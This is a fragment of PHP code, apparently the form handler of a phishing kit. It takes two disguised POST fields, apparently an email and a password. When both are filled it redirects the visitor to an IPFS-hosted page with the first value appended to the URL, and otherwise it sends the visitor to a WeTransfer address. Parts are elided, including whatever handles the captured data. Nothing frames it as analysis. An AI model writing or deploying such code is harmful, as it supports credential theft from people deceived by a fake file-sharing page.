...
if($_POST["simdia"] != "" && $_POST["pentail"] != ""){
    ...
    header("Location: https://cloudflare-ipfs.com/ipfs/bafybeiewjgyf2rdnnenykff74fumxkzi76phvchvbijdz6mzpbzpp46chu/pat2.html#".$_POST['simdia']);
} else {
    // Redirect the user if 'simdia' or 'pentail' fields are empty
    header("Location: https://www.wetransfer.com/undefined");
}
?>